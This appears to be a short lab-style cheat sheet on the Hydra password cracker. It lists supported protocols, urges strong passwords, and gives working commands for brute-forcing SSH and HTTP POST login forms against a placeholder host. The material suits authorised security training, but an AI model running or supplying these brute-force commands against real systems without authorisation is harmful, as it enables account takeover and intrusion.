# Hydra Brute Force Tool

## Introduction

Hydra is a powerful brute force online password cracking program, designed to quickly discover system login passwords. It efficiently runs through a list, attempting to brute force authentication services for various protocols like SSH, FTP, HTTP, and many more.

## Supported Protocols

Hydra supports a wide range of protocols, including but not limited to:

- SSH
- FTP
- HTTP/HTTPS
- SMTP
- SNMP
- MySQL
- Oracle
- SMB
- Telnet
- VNC
- And many more...

For a detailed list of supported protocols and their options, refer to the [Kali Hydra tool page](https://tools.kali.org/password-attacks/hydra).

## Importance of Strong Passwords

The significance of using a robust password cannot be overstated. Common passwords and default credentials are vulnerable to brute force attacks. Change default login credentials, especially for applications like CCTV cameras and web frameworks that often use weak defaults like admin:password.

## Usage

### SSH Brute Force

To brute force SSH with a specified username and password list:

```bash
hydra -l <username> -P <path to passlist.txt> ssh://MACHINE_IP -t 4
```

### Web Form (POST Method)

To brute force a web form using Hydra:

```bash
hydra -l <username> -P <path to wordlist.txt> MACHINE_IP http-post-form "<path>:<login_credentials>:<invalid_response>" -V
```
For example :

```bash
hydra -l user -P passwords.txt MACHINE_IP http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
```

Happy Brute Forcing